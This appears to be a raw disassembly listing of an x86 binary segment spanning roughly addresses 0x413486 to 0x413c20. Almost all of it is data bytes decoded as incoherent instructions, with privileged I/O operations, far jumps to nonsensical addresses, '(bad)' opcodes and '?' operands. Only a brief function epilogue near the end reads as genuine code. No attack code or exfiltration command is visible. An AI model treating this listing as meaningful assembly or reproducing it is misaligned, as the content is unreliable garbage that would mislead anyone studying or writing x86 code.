  413486:	add    al,0xd6
  413488:	shl    WORD PTR [edi-0x69364988],1
  41348f:	adc    al,0x72
  413491:	sbb    eax,0x88ff4419
  413496:	loop   0x413516
  413498:	xchg   edi,eax
  413499:	mov    esi,0x1100ba80
  41349e:	sbb    bh,ch
  4134a0:	out    0x66,eax
  4134a2:	sub    eax,0xd9bae266
  4134a7:	es push ebp
  4134a9:	imul   edi,DWORD PTR [edi-0x64e20e2c],0xffffffb9
  4134b0:	imul   BYTE PTR [edx-0x27]
  4134b3:	jno    0x413525
  4134b5:	lahf   
  4134b6:	or     DWORD PTR [esi],ebp
  4134b8:	jbe    0x4134eb
  4134ba:	hlt    
  4134bb:	mov    cl,BYTE PTR [eax+0x625456a1]
  4134c1:	test   eax,0xf2a202ed
  4134c6:	bound  ebx,QWORD PTR [ebx-0x39]
  4134c9:	neg    ch
  4134cb:	xchg   ebp,eax
  4134cc:	jmp    0x6befd3fc
  4134d1:	retf   0xecf8
  4134d4:	mov    ebx,0x49b3ee95
  4134d9:	mov    fs,edi
  4134db:	mov    eax,ds:0x40c146b
  4134e0:	and    bh,BYTE PTR [ebx+0x7b]
  4134e3:	add    eax,0xfa5b4825
  4134e8:	loopne 0x4134ed
  4134ea:	and    ebx,DWORD PTR [ecx+0xe28c23c]
  4134f0:	and    BYTE PTR [ecx-0x6c],cl
  4134f3:	xchg   ebx,eax
  4134f4:	cli    
  4134f5:	hlt    
  4134f6:	fdiv   st(2),st
  4134f8:	cmp    cl,BYTE PTR [ebx+0x16219a5]
  4134fe:	loope  0x4134e6
  413500:	fwait
  413501:	sub    esi,DWORD PTR [ecx-0x80]
  413504:	jae    0x413574
  413506:	sub    esp,eax
  413508:	loop   0x413500
  41350a:	popf   
  41350b:	xchg   ecx,eax
  41350c:	lods   al,BYTE PTR ds:[esi]
  41350d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41350e:	xchg   edi,eax
  41350f:	add    al,0x8e
  413511:	mov    bh,0x46
  413513:	popf   
  413514:	fist   WORD PTR [esi+ecx*4+0x58]
  413518:	jg     0x413583
  41351a:	ja     0x413532
  41351c:	(bad)  
  41351d:	cwde   
  41351e:	ja     0x4134bc
  413520:	pop    edi
  413521:	inc    esi
  413522:	lock inc eax
  413524:	mov    ah,0x66
  413526:	dec    edx
  413527:	retf   
  413528:	mov    dh,0xac
  41352a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41352b:	adc    BYTE PTR [ecx+0x7a059be3],dl
  413531:	inc    ebx
  413532:	das    
  413533:	out    0x8f,eax
  413535:	sbb    BYTE PTR [esi+0x60b5103b],0x32
  41353c:	dec    ebp
  41353d:	enter  0x8586,0x96
  413541:	(bad)  
  413542:	stos   BYTE PTR es:[edi],al
  413543:	sub    ah,bh
  413545:	stos   BYTE PTR es:[edi],al
  413546:	iret   
  413547:	xchg   edx,eax
  413548:	in     eax,dx
  413549:	xor    al,BYTE PTR [ecx]
  41354b:	fidiv  WORD PTR [ebx]
  41354d:	sbb    DWORD PTR [ebx],ebp
  41354f:	popf   
  413550:	lock xchg ebx,eax
  413552:	inc    esi
  413553:	mov    esp,0xed1aa3d
  413558:	dec    esp
  413559:	sub    ebp,DWORD PTR [ebp+0x46]
  41355c:	icebp  
  41355d:	jo     0x413541
  41355f:	sbb    eax,0xe80c70d8
  413564:	aaa    
  413565:	fistp  QWORD PTR [esi-0x71]
  413568:	out    dx,eax
  413569:	mov    dl,0x23
  41356b:	test   al,0x9d
  41356d:	sbb    ecx,ebx
  41356f:	inc    edi
  413570:	add    eax,eax
  413572:	add    eax,0xca6b55b4
  413577:	xchg   ebx,eax
  413578:	call   0xdabb:0x14642dc5
  41357f:	in     eax,0x8d
  413581:	lods   al,BYTE PTR ds:[esi]
  413582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413583:	bound  edi,QWORD PTR [eax+0x38]
  413586:	lods   al,BYTE PTR ds:[esi]
  413587:	stos   BYTE PTR es:[edi],al
  413588:	xchg   DWORD PTR [ebp+eiz*2-0x2],edi
  41358c:	ss pop eax
  41358e:	mov    esi,0x5b56852f
  413593:	push   cs
  413594:	adc    al,0x39
  413596:	xchg   esi,eax
  413597:	(bad)  
  413598:	cmp    ebp,DWORD PTR [eax]
  41359a:	loop   0x4135a8
  41359c:	pop    ebx
  41359d:	jo     0x4135c0
  41359f:	jecxz  0x4135f6
  4135a1:	loop   0x4135a3
  4135a3:	jecxz  0x4135d4
  4135a5:	adc    dl,BYTE PTR [ebx+0x30cafe79]
  4135ab:	push   ss
  4135ac:	(bad)  
  4135ad:	in     al,dx
  4135ae:	fst    st(7)
  4135b0:	or     ah,BYTE PTR [ebx]
  4135b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135b4:	inc    ebp
  4135b5:	jb     0x4135e1
  4135b7:	pop    edi
  4135b8:	sbb    DWORD PTR [ecx+ebx*1],0xc90b1450
  4135bf:	jge    0x413574
  4135c1:	daa    
  4135c2:	cmp    eax,0x45284b5c
  4135c7:	mov    esp,DWORD PTR [edx-0x1]
  4135ca:	push   ebx
  4135cb:	or     eax,0x638d6eac
  4135d0:	sub    BYTE PTR [eax+0x2817de52],ch
  4135d6:	ds cmc 
  4135d8:	rol    BYTE PTR [ecx],0xcf
  4135db:	vpunpckhwd ymm4,ymm6,YMMWORD PTR [edx-0x50]
  4135e0:	pop    edi
  4135e1:	push   ss
  4135e2:	cmc    
  4135e3:	sbb    al,BYTE PTR [edi-0x1f48d76d]
  4135e9:	bound  ebp,QWORD PTR [esp+edx*4+0x7c]
  4135ed:	ins    DWORD PTR es:[edi],dx
  4135ee:	push   esp
  4135ef:	fwait
  4135f0:	xor    DWORD PTR [edi+0x38490abe],edi
  4135f6:	retf   0x13e3
  4135f9:	in     al,0xd3
  4135fb:	shr    eax,cl
  4135fd:	push   ds
  4135fe:	fdiv   st,st(5)
  413600:	stc    
  413601:	test   BYTE PTR [esi-0x2c20cc37],ah
  413607:	mov    DWORD PTR [edx],edi
  413609:	imul   BYTE PTR [esi+edx*1-0x20]
  41360d:	out    dx,al
  41360e:	daa    
  41360f:	bts    DWORD PTR [ebx+0x4f6c5ea8],esi
  413616:	mov    bl,BYTE PTR [ebx+ecx*1-0x32]
  41361a:	shl    DWORD PTR [esi-0x5e],cl
  41361d:	jno    0x4135dc
  41361f:	ja     0x413659
  413621:	cmc    
  413622:	fs out dx,eax
  413624:	adc    eax,0x9d91e2dd
  413629:	push   ebx
  41362a:	or     BYTE PTR [eax+ebx*4],bl
  41362d:	cmp    BYTE PTR [ebx],dl
  41362f:	and    ebp,edi
  413631:	in     al,dx
  413632:	fdiv   DWORD PTR [edi+0x173d1e03]
  413638:	int    0xbc
  41363a:	les    di,DWORD PTR [edx]
  41363d:	or     dl,BYTE PTR [ebx+ebx*4-0x55ec5a7b]
  413644:	fcomp  DWORD PTR [edx+0x6f]
  413647:	call   0x12429895
  41364c:	dec    edx
  41364d:	imul   edx,DWORD PTR [eax-0x38],0xffffffc9
  413651:	fimul  DWORD PTR [ebx]
  413653:	test   BYTE PTR [ebx-0x7a9a787c],bh
  413659:	push   esp
  41365a:	jae    0x413642
  41365c:	sbb    ah,BYTE PTR [ecx+eax*2+0x2279b1e9]
  413663:	daa    
  413664:	fstp   DWORD PTR [eax+eax*2+0x1e]
  413668:	mov    dh,BYTE PTR [ebx+0x10]
  41366b:	add    edx,DWORD PTR [ebx+0x7bbd68ea]
  413671:	call   0xaaf6c2f0
  413676:	pop    ebx
  413677:	dec    edi
  413678:	jae    0x4136f2
  41367a:	icebp  
  41367b:	lahf   
  41367c:	inc    esi
  41367d:	xor    al,BYTE PTR [esi]
  41367f:	push   eax
  413680:	xor    BYTE PTR [edx-0x282fd0c6],bh
  413686:	repnz push edi
  413688:	inc    esp
  413689:	into   
  41368a:	imul   ebx,DWORD PTR [bp+di+0x4129],0x1248b81f
  413693:	dec    esp
  413694:	inc    edi
  413695:	xor    DWORD PTR [ecx-0x67],0x50
  413699:	repnz or al,0x54
  41369c:	mov    ch,0xde
  41369e:	sti    
  41369f:	jmp    0xb6dd:0xf3cf4a28
  4136a6:	js     0x4136f4
  4136a8:	adc    bl,BYTE PTR [ebp-0x4a8c1b8a]
  4136ae:	lock aad 0x10
  4136b1:	xor    BYTE PTR [ebx],dh
  4136b3:	shl    BYTE PTR [eax-0x12],0xd5
  4136b7:	push   0x52
  4136b9:	sbb    esp,esp
  4136bb:	mov    esi,0xdbb04051
  4136c0:	ins    DWORD PTR es:[edi],dx
  4136c1:	cli    
  4136c2:	cwde   
  4136c3:	stos   DWORD PTR es:[edi],eax
  4136c4:	lods   eax,DWORD PTR ds:[esi]
  4136c5:	cmp    ebx,DWORD PTR [esi-0x4b]
  4136c8:	iret   
  4136c9:	jge    0x413746
  4136cb:	or     DWORD PTR [ebp-0x65594cef],esp
  4136d1:	repz jmp 0x41367d
  4136d4:	fiadd  DWORD PTR [esp+ebx*2]
  4136d7:	xor    al,0x7c
  4136d9:	add    bl,BYTE PTR [edx-0x3c]
  4136dc:	mov    eax,0xc12fe78
  4136e1:	repnz ins DWORD PTR es:[edi],dx
  4136e3:	adc    ah,BYTE PTR [esp+eax*2+0x27]
  4136e7:	enter  0x2389,0x17
  4136eb:	ds dec eax
  4136ed:	push   ss
  4136ee:	sbb    eax,0x6b316aad
  4136f3:	nop
  4136f4:	add    eax,0x2e52ca09
  4136f9:	or     ah,BYTE PTR [ebx-0x5a06cbf5]
  4136ff:	(bad)  
  413700:	(bad)  
  413701:	mov    dl,dh
  413703:	jmp    0x6477:0xc43d35e8
  41370a:	and    eax,0x3910b489
  41370f:	in     al,dx
  413710:	jb     0x413758
  413712:	xor    DWORD PTR [ecx],esp
  413714:	fsub   QWORD PTR [edx]
  413716:	sub    al,0xa0
  413718:	stos   DWORD PTR es:[edi],eax
  413719:	sti    
  41371a:	or     ecx,ecx
  41371c:	push   ss
  41371d:	repz cwde 
  41371f:	sahf   
  413720:	sti    
  413721:	scas   eax,DWORD PTR es:[edi]
  413722:	ins    DWORD PTR es:[edi],dx
  413723:	retf   
  413724:	cwde   
  413725:	sbb    BYTE PTR [eax],ah
  413727:	inc    ecx
  413728:	and    edx,DWORD PTR [edi+ecx*1]
  41372b:	aas    
  41372c:	add    al,0xe3
  41372e:	loop   0x413737
  413730:	mov    eax,0x440b1407
  413735:	mov    ebx,DWORD PTR [ebp-0x25c17d8b]
  41373b:	cld    
  41373c:	hlt    
  41373d:	push   edi
  41373e:	ret    
  41373f:	mov    edi,0xd395d6c7
  413744:	xchg   ebp,eax
  413745:	xchg   DWORD PTR [esi-0x3d],ecx
  413748:	out    dx,al
  413749:	sbb    ah,BYTE PTR [edi-0x38]
  41374c:	iret   
  41374d:	das    
  41374e:	sbb    BYTE PTR [esp+edx*8+0x17],dh
  413752:	adc    DWORD PTR [ebx-0x2b606da0],edi
  413758:	pop    edx
  413759:	mov    dl,0x95
  41375b:	add    ecx,esp
  41375d:	mov    eax,0xeaf72353
  413762:	iret   
  413763:	xchg   ebp,eax
  413764:	mov    dh,0xbd
  413766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413767:	mov    bl,0x4
  413769:	(bad)  
  41376c:	inc    esp
  41376d:	push   ds
  41376e:	pop    ds
  41376f:	xchg   ecx,eax
  413770:	push   cs
  413771:	lds    ecx,FWORD PTR gs:[esi+0x47]
  413775:	mov    DWORD PTR [ecx-0x5e05d912],ebp
  41377b:	xlat   BYTE PTR ds:[ebx]
  41377c:	cs fwait
  41377e:	mov    ecx,ecx
  413780:	mov    cl,BYTE PTR [esp+ecx*8+0x3d]
  413784:	out    dx,eax
  413785:	daa    
  413786:	(bad)  
  413787:	or     ch,BYTE PTR [edi]
  413789:	cmp    al,BYTE PTR [edx]
  41378b:	(bad)  
  41378c:	iret   
  41378d:	mov    eax,0x1c49dddb
  413792:	popf   
  413793:	pop    edi
  413794:	daa    
  413795:	pop    eax
  413796:	sub    al,0x40
  413798:	retf   
  413799:	pop    edi
  41379a:	inc    ebx
  41379b:	inc    esp
  41379c:	mov    edx,0x2d5fe136
  4137a1:	and    bl,dh
  4137a3:	cmp    ebp,DWORD PTR [ebx-0x383c8871]
  4137a9:	xchg   ebp,eax
  4137aa:	loope  0x413775
  4137ac:	mov    cs,WORD PTR [esp+eiz*4+0xd]
  4137b0:	and    eax,edi
  4137b2:	fld    st(0)
  4137b4:	cli    
  4137b5:	push   ecx
  4137b6:	in     eax,0xe
  4137b8:	adc    al,0x92
  4137ba:	and    DWORD PTR [ebp+0x359f9caf],esp
  4137c0:	sbb    ebp,DWORD PTR [eiz*1+0x10be2fe1]
  4137c7:	test   DWORD PTR [eax-0x36c389be],0x2c6f1c76
  4137d1:	rcr    BYTE PTR [ecx-0x3a],0xf4
  4137d5:	add    eax,0x31cecb7f
  4137da:	or     BYTE PTR [esi],0xd0
  4137dd:	lahf   
  4137de:	and    al,0x57
  4137e0:	push   ds
  4137e1:	xchg   edx,eax
  4137e2:	js     0x41381f
  4137e4:	sub    al,0x5f
  4137e6:	in     eax,dx
  4137e7:	repz ffree st(5)
  4137ea:	ins    BYTE PTR es:[edi],dx
  4137eb:	clc    
  4137ec:	xor    ebx,DWORD PTR [esi-0x73fc8bb7]
  4137f2:	enter  0x99af,0xd1
  4137f6:	pop    ss
  4137f7:	adc    DWORD PTR [ecx],0x1f
  4137fa:	sub    ch,bl
  4137fc:	nop
  4137fd:	mov    ds:0x5c74ae98,eax
  413802:	mov    esp,DWORD PTR [edi]
  413804:	pushf  
  413805:	rcr    DWORD PTR [ebp+0x561e793c],1
  41380b:	popf   
  41380c:	repz imul ebp,esp,0xffffff81
  413810:	(bad)  
  413811:	je     0x413866
  413813:	test   eax,0x37590f91
  413818:	std    
  413819:	ret    
  41381a:	leave  
  41381b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41381c:	sub    BYTE PTR [eax],dh
  41381e:	or     al,0x6
  413820:	into   
  413821:	push   ss
  413822:	cmp    BYTE PTR [edi],0x56
  413825:	inc    ebp
  413826:	leave  
  413827:	hlt    
  413828:	inc    eax
  413829:	hlt    
  41382a:	push   ebx
  41382b:	jnp    0x413856
  41382d:	mov    cl,0x7a
  41382f:	add    BYTE PTR [ebx+0x37a946a],ah
  413835:	outs   dx,BYTE PTR ds:[esi]
  413836:	and    DWORD PTR [edx-0x5d],eax
  413839:	mov    ah,0x74
  41383b:	dec    ebp
  41383c:	push   edx
  41383d:	bound  edi,QWORD PTR [eax+0x66]
  413840:	mov    bl,bl
  413842:	mov    dh,0x11
  413844:	mov    WORD PTR [ebp+0x58337c54],es
  41384a:	loope  0x413856
  41384c:	cwde   
  41384d:	loope  0x4138c6
  41384f:	ret    0x746d
  413852:	xchg   ebx,esi
  413854:	pusha  
  413855:	inc    ebx
  413856:	push   ebp
  413857:	lds    edi,FWORD PTR [ecx-0x72728478]
  41385d:	cmp    edi,DWORD PTR [ebp+0x5]
  413860:	mov    es,WORD PTR [ecx-0x56516999]
  413866:	xor    BYTE PTR [esi-0x6],cl
  413869:	jne    0x41382b
  41386b:	cmp    eax,0xd9318149
  413870:	fwait
  413871:	pop    es
  413872:	daa    
  413873:	add    cl,al
  413875:	mov    al,ds:0x2fed8661
  41387a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41387b:	and    ebx,DWORD PTR cs:[ebx+0x15]
  41387f:	cmp    edx,DWORD PTR [edi-0x6b]
  413882:	inc    esi
  413883:	mov    dh,0x5
  413885:	mov    al,ds:0xf58a3ca3
  41388a:	sub    DWORD PTR [ebp-0x54809134],esp
  413890:	rcr    BYTE PTR [edx-0x2f8b396e],cl
  413896:	sbb    al,0xec
  413898:	int    0x69
  41389a:	adc    BYTE PTR [eax],ch
  41389c:	pop    es
  41389d:	cld    
  41389e:	dec    ecx
  41389f:	in     eax,0x89
  4138a1:	in     al,0x94
  4138a3:	add    eax,0x7335446e
  4138a8:	dec    ecx
  4138a9:	pop    edi
  4138aa:	popf   
  4138ab:	xchg   edi,eax
  4138ac:	pop    edi
  4138ad:	jp     0x413833
  4138af:	gs in  eax,dx
  4138b1:	pusha  
  4138b2:	mov    al,0x34
  4138b4:	ins    DWORD PTR es:[edi],dx
  4138b5:	jne    0x41388f
  4138b7:	out    dx,eax
  4138b8:	(bad)  
  4138b9:	push   ebp
  4138ba:	mov    bl,0x43
  4138bc:	pop    edx
  4138bd:	mov    edx,0xa8cc62a6
  4138c2:	lock repnz adc eax,DWORD PTR [esi+0x76b89d1f]
  4138ca:	gs leave 
  4138cc:	fs jno 0x413861
  4138cf:	mov    WORD PTR ds:0xbdcf463d,?
  4138d5:	adc    dh,BYTE PTR [ecx]
  4138d7:	out    dx,eax
  4138d8:	mov    al,0x4d
  4138da:	loop   0x4138b8
  4138dc:	jl     0x413946
  4138de:	mov    WORD PTR [esp+eiz*4+0x7328dae],?
  4138e5:	loopne 0x4138e2
  4138e7:	push   esp
  4138e8:	test   bh,bl
  4138ea:	push   0xfffffff8
  4138ec:	push   ss
  4138ed:	not    BYTE PTR [ebp-0x65eb0aaa]
  4138f3:	out    dx,eax
  4138f4:	cli    
  4138f5:	in     eax,0xf8
  4138f7:	hlt    
  4138f8:	xlat   BYTE PTR ds:[ebx]
  4138f9:	xor    BYTE PTR [ebp-0x48],dl
  4138fc:	mov    ebx,0x12eee00a
  413901:	jnp    0x413943
  413903:	je     0x4138eb
  413905:	fidiv  DWORD PTR [ecx-0x38402375]
  41390b:	cmp    al,0xb
  41390d:	lods   eax,DWORD PTR ds:[esi]
  41390e:	xor    BYTE PTR [eax+0xe],0x23
  413912:	cmp    DWORD PTR [edi+ebx*2],esi
  413915:	call   DWORD PTR [ebx]
  413917:	dec    ecx
  413918:	and    al,BYTE PTR [eax-0x4e]
  41391b:	loopne 0x41396b
  41391d:	call   FWORD PTR [edx]
  41391f:	ja     0x413941
  413921:	(bad)  
  413922:	div    al
  413924:	jl     0x413958
  413926:	and    cl,ch
  413928:	jecxz  0x4138ab
  41392a:	inc    esp
  41392b:	test   eax,0x6ea44d8b
  413930:	icebp  
  413931:	adc    cl,BYTE PTR [ecx]
  413933:	fsub   QWORD PTR [edx]
  413935:	mov    BYTE PTR [edi+0x5],dh
  413938:	xchg   BYTE PTR ds:0x6c9782c6,ch
  41393e:	jae    0x413968
  413940:	sbb    DWORD PTR [ebx],0x957b42dd
  413946:	xor    ah,bl
  413948:	push   eax
  413949:	mov    eax,ds:0xcd46e4a5
  41394e:	out    dx,eax
  41394f:	mov    eax,eax
  413951:	loop   0x413952
  413953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413954:	hlt    
  413955:	jle    0x4139a3
  413957:	or     ah,BYTE PTR [ebx]
  413959:	ins    DWORD PTR es:[edi],dx
  41395a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41395b:	xchg   BYTE PTR [edi-0x1e654c70],al
  413961:	add    eax,DWORD PTR [edx+0x4c]
  413964:	sbb    bl,BYTE PTR [eax-0x6ea77958]
  41396a:	push   eax
  41396b:	mov    ebp,0x83c9e1dc
  413970:	arpl   WORD PTR [edx],di
  413972:	jecxz  0x4139dc
  413974:	xchg   DWORD PTR [esi],ebx
  413976:	pop    edi
  413977:	mov    bh,0x99
  413979:	inc    ebx
  41397a:	retf   
  41397b:	aas    
  41397c:	cmp    dl,BYTE PTR [ebx]
  41397e:	jp     0x41390e
  413980:	dec    ebp
  413981:	hlt    
  413982:	mov    dh,0xf9
  413984:	sub    DWORD PTR [esi+0x176aa914],eax
  41398a:	mov    gs,eax
  41398c:	fs xor eax,0x9d93315e
  413992:	xor    DWORD PTR [edx-0x5a1d0f94],edx
  413998:	cmp    eax,0x9b056844
  41399d:	mov    WORD PTR [ebp+ecx*2+0x41093822],cs
  4139a4:	shl    DWORD PTR [esi-0x6e],0x9b
  4139a8:	push   ebx
  4139a9:	pop    edi
  4139aa:	outs   dx,DWORD PTR ds:[esi]
  4139ab:	int3   
  4139ac:	je     0x41394f
  4139ae:	jne    0x41393d
  4139b0:	sub    ch,dh
  4139b2:	mov    ebx,ebx
  4139b4:	cs inc ebp
  4139b6:	int    0xf9
  4139b8:	sti    
  4139b9:	add    bh,bl
  4139bb:	jns    0x4139dd
  4139bd:	add    DWORD PTR [esi],0x582cf1e7
  4139c3:	jnp    0x413a14
  4139c5:	sbb    ebp,edi
  4139c7:	jge    0x413a1b
  4139c9:	dec    ecx
  4139ca:	in     eax,dx
  4139cb:	inc    eax
  4139cc:	cld    
  4139cd:	inc    ebp
  4139ce:	int    0x23
  4139d0:	mov    bh,0x1e
  4139d2:	jbe    0x41398c
  4139d4:	and    ebx,0x5
  4139d7:	fimul  WORD PTR [ebx-0x3407172f]
  4139dd:	sub    eax,0xfbd8e5ee
  4139e2:	adc    al,0x1f
  4139e4:	xor    dl,BYTE PTR [ebp-0x1e]
  4139e7:	aaa    
  4139e8:	xchg   ecx,eax
  4139e9:	sbb    DWORD PTR [ebp+ebp*8+0x48],edi
  4139ed:	jne    0x4139c8
  4139ef:	pop    esi
  4139f0:	loope  0x413a67
  4139f2:	imul   esi,DWORD PTR [ebp-0x3de6f4b],0x9
  4139f9:	pop    esi
  4139fa:	inc    ecx
  4139fb:	inc    ebx
  4139fc:	adc    DWORD PTR [ecx-0x7e],0x51
  413a00:	xor    BYTE PTR [esi+0x6b93fd4f],0xe8
  413a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a08:	xchg   edx,eax
  413a09:	dec    ebx
  413a0a:	jmp    0x50c3:0x7f54a854
  413a11:	repnz inc eax
  413a13:	bound  ebx,QWORD PTR [ebp+0x5]
  413a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a17:	rol    esp,0x20
  413a1a:	mov    ebp,0x8f615475
  413a1f:	sub    edx,DWORD PTR [ebx+edi*1-0x6a47b571]
  413a26:	stc    
  413a27:	mov    ecx,0x5375d62c
  413a2c:	pop    edx
  413a2d:	hlt    
  413a2e:	adc    ah,bh
  413a30:	push   ds
  413a31:	test   eax,0x560f1c25
  413a36:	out    dx,al
  413a37:	retf   
  413a38:	gs test eax,0x773eb613
  413a3e:	in     eax,dx
  413a3f:	outs   dx,DWORD PTR ds:[esi]
  413a40:	loopne 0x413a9b
  413a42:	into   
  413a43:	enter  0xd506,0x52
  413a47:	inc    eax
  413a48:	loopne 0x413a83
  413a4a:	and    al,0xf0
  413a4c:	push   eax
  413a4d:	inc    ebp
  413a4e:	jno    0x4139f0
  413a50:	pop    ds
  413a51:	div    BYTE PTR [edi+0x3e]
  413a54:	and    al,0x56
  413a56:	in     eax,0x3c
  413a58:	fisttp DWORD PTR [ecx+0x1fa79173]
  413a5e:	inc    ebp
  413a5f:	sbb    BYTE PTR [edi],ch
  413a61:	mov    dh,0x75
  413a63:	jnp    0x413abd
  413a65:	adc    BYTE PTR [ecx-0x41],dh
  413a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a69:	mov    edi,0x3bad6aca
  413a6e:	and    BYTE PTR [ebp-0x104f28ef],bh
  413a74:	push   ecx
  413a75:	(bad)  
  413a76:	push   ds
  413a77:	call   DWORD PTR [ebx+0x2012738b]
  413a7d:	les    ebp,FWORD PTR [esi]
  413a7f:	test   BYTE PTR [esi-0x1715a3c3],cl
  413a85:	retf   0xa1de
  413a88:	add    al,0xfb
  413a8a:	test   DWORD PTR [eax-0x15],ecx
  413a8d:	add    al,0x5f
  413a8f:	mov    eax,0xd22095bb
  413a94:	mov    eax,ds:0x437e922b
  413a99:	push   0x3857667d
  413a9e:	cdq    
  413a9f:	xor    DWORD PTR [ecx],ecx
  413aa1:	xchg   ecx,eax
  413aa2:	cdq    
  413aa3:	xor    eax,0x199d646b
  413aa8:	dec    ebx
  413aa9:	nop
  413aaa:	and    eax,0xf20a47e4
  413aaf:	mov    dh,0x56
  413ab1:	xor    BYTE PTR [eax+edi*4+0x2d0b8ba4],ah
  413ab8:	das    
  413ab9:	ja     0x413ada
  413abb:	nop
  413abc:	mov    edx,0xc7f0635c
  413ac1:	stos   BYTE PTR es:[edi],al
  413ac2:	hlt    
  413ac3:	lods   eax,DWORD PTR ds:[esi]
  413ac4:	jnp    0x413b0c
  413ac6:	push   esi
  413ac7:	lods   al,BYTE PTR ds:[esi]
  413ac8:	data16 aad 0xc1
  413acb:	mov    ds:0x5dbf8023,eax
  413ad0:	arpl   WORD PTR [ecx],bx
  413ad2:	clc    
  413ad3:	nop
  413ad4:	not    ecx
  413ad6:	add    edx,DWORD PTR ds:0x989e0994
  413adc:	das    
  413add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ade:	mov    cl,0xc8
  413ae0:	inc    edi
  413ae1:	(bad)  
  413ae3:	mov    eax,ds:0xdeacc457
  413ae8:	xchg   edi,eax
  413ae9:	jecxz  0x413b2e
  413aeb:	pop    edx
  413aec:	fucomp st(0)
  413aee:	sub    BYTE PTR [eax+0x34bd5b4f],0x21
  413af5:	cmp    DWORD PTR [eax+0x4847422],edi
  413afb:	pcmpeqb mm3,mm7
  413afe:	ins    BYTE PTR es:[edi],dx
  413aff:	mov    eax,esi
  413b01:	scas   al,BYTE PTR es:[edi]
  413b02:	jne    0x413b81
  413b04:	data16 lods al,BYTE PTR ds:[esi]
  413b06:	dec    esi
  413b07:	adc    al,0xe6
  413b09:	nop
  413b0a:	imul   edx,ecx,0x7b18e589
  413b10:	mov    edx,0x2c542084
  413b15:	(bad)  
  413b16:	and    al,0xfd
  413b18:	ret    
  413b19:	cs clc 
  413b1b:	lods   eax,DWORD PTR ds:[esi]
  413b1c:	sbb    esp,DWORD PTR [edi+0x14ef42c9]
  413b22:	les    esi,FWORD PTR [ebx-0xef827b3]
  413b28:	sbb    al,0x70
  413b2a:	out    dx,al
  413b2b:	xchg   ecx,eax
  413b2c:	inc    DWORD PTR [edi]
  413b2e:	pop    ecx
  413b2f:	mov    eax,ds:0xc7f03dfa
  413b34:	push   ss
  413b35:	push   ebp
  413b36:	add    DWORD PTR [ebp+0x666ac4aa],edx
  413b3c:	or     esi,DWORD PTR [ecx-0x8]
  413b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b40:	and    eax,DWORD PTR [ebp-0xe813d71]
  413b46:	xor    dh,BYTE PTR [edx+0x7562da30]
  413b4c:	pop    es
  413b4d:	nop
  413b4e:	add    BYTE PTR [ecx+0x2bbe2115],0xed
  413b55:	pushf  
  413b56:	add    bh,dl
  413b58:	lods   al,BYTE PTR ds:[esi]
  413b59:	repz dec esp
  413b5b:	xchg   esp,eax
  413b5c:	jecxz  0x413b5b
  413b5e:	loope  0x413b6b
  413b60:	jno    0x413b0f
  413b62:	sbb    eax,0x4af53890
  413b67:	in     al,dx
  413b68:	rcl    esp,1
  413b6a:	test   al,0xa1
  413b6c:	sub    ebx,DWORD PTR ds:0x3164af88
  413b72:	xchg   edx,eax
  413b73:	fld    DWORD PTR [esi]
  413b75:	sub    eax,0xe8e19dc7
  413b7a:	lds    ebx,FWORD PTR [ecx-0x7d]
  413b7d:	cs in  al,0xc5
  413b80:	and    DWORD PTR ds:0xd4a0e85e,ecx
  413b86:	xchg   ebx,eax
  413b87:	out    0x36,eax
  413b89:	and    al,0x7b
  413b8b:	jge    0x413ba6
  413b8d:	fs inc edx
  413b8f:	mov    edx,0xee76748f
  413b94:	sbb    ebx,DWORD PTR [ebp-0x5b06325a]
  413b9a:	int3   
  413b9b:	jmp    0xf55e:0x41c57009
  413ba2:	inc    edi
  413ba3:	pop    ebp
  413ba4:	retf   
  413ba5:	les    ecx,FWORD PTR [eax+0x50dfee89]
  413bab:	stos   DWORD PTR es:[edi],eax
  413bac:	(bad)
  413bb1:	lods   al,BYTE PTR ds:[esi]
  413bb2:	mov    edx,0x7d14d59e
  413bb7:	or     dl,dh
  413bb9:	jmp    0x413bde
  413bbb:	mov    ebp,0xc55ed909
  413bc0:	pop    eax
  413bc1:	sbb    al,0xb8
  413bc3:	cld    
  413bc4:	ins    BYTE PTR es:[edi],dx
  413bc5:	pusha  
  413bc6:	repz jne 0x413c10
  413bc9:	mov    al,0x3a
  413bcb:	fsub   st(1),st
  413bcd:	mov    ebx,0x3d5e30fb
  413bd2:	pop    esp
  413bd3:	test   al,0x1d
  413bd5:	add    eax,0xd124fb3
  413bda:	outs   dx,BYTE PTR ds:[esi]
  413bdb:	sub    dl,bh
  413bdd:	adc    al,0xd8
  413bdf:	ret    0x58c0
  413be2:	pop    edx
  413be3:	mov    ecx,DWORD PTR [ebp-0x8]
  413be6:	xor    ecx,eax
  413be8:	mov    eax,DWORD PTR [ebp+0x10]
  413beb:	add    ecx,esi
  413bed:	mov    DWORD PTR [eax],ecx
  413bef:	pop    edi
  413bf0:	pop    esi
  413bf1:	pop    ebx
  413bf2:	leave  
  413bf3:	ret    0xc
  413bf6:	jne    0x413c0b
  413bf8:	adc    BYTE PTR [eax],al
  413bfa:	std    
  413bfb:	push   ds
  413bfc:	adc    BYTE PTR [eax],al
  413bfe:	aas    
  413bff:	adc    BYTE PTR fs:[eax],al
  413c02:	sbb    cl,BYTE PTR [esi]
  413c04:	adc    BYTE PTR [eax],al
  413c06:	sbb    BYTE PTR [eax+0x10],dl
  413c09:	add    BYTE PTR [eax],ah
  413c0b:	push   es
  413c0c:	adc    BYTE PTR [eax],al
  413c0e:	out    dx,al
  413c0f:	jg     0x413c21
  413c11:	add    BYTE PTR [ebx],al
  413c13:	dec    edi
  413c14:	adc    BYTE PTR [eax],al
  413c16:	mov    esp,0x5500103b
  413c1b:	jns    0x413c2d
  413c1d:	add    BYTE PTR [edx],ch
  413c1f:	inc    eax
  413c20:	adc    BYTE PTR [eax],al
